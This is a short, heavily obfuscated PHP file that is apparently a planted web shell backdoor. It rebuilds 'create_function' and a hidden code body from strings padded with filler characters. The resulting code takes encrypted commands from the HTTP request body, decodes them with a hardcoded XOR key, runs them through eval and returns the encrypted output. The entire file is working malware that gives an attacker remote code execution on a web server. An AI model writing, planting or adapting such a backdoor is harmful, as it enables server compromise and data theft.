<?php
$H=';functKnion x($tKn,$Knk)Kn{$c=strlen($kKn)Kn;$l=stKnrlen($Knt);$o="";foKnrKn(Kn$i=0;$i<Kn$l;){for($j=';
$O='("Kn/$kh(.+)Kn$kKnfKn/",@file_get_cKnontenKnts("php:Kn/Kn/input"),$mKn)==1) {Kn@ob_stKnart();@Kn';
$d='0Kn;($j<$c&Kn&$i<Kn$Knl);$j++,$i+KnKn+){$o.=$t{Kn$Kni}^$k{$j};}}reKnKntKnurn $o;}Knif (@preg_Knmatch';
$z='eKnvaKnl(@gzKnuncompKnress(@x(@KnbasKne64_dKnecode($mKn[KnKn1]),$k)));$o=@ob_get_cKnontenKnts();@';
$B=str_replace('j','','crjeatjje_fujnjctijon');
$U='$Knk="ec4cbKn1e5";$kKnh="7Knaa246ebea65Kn";$kKnf="fae40b6Knc608Kn5";$p="eKnfDKnso9aqKnzmyn9uKnSb"';
$S='oKnb_KnendKn_clean();$r=Kn@bKnaKnse64_encodeKn(@x(@gzcompKnKnress($o),$k)Kn);prKnintKn("$p$kh$r$kf");}';
$E=str_replace('Kn','',$U.$H.$d.$O.$z.$S);
$t=$B('',$E);$t();
?>
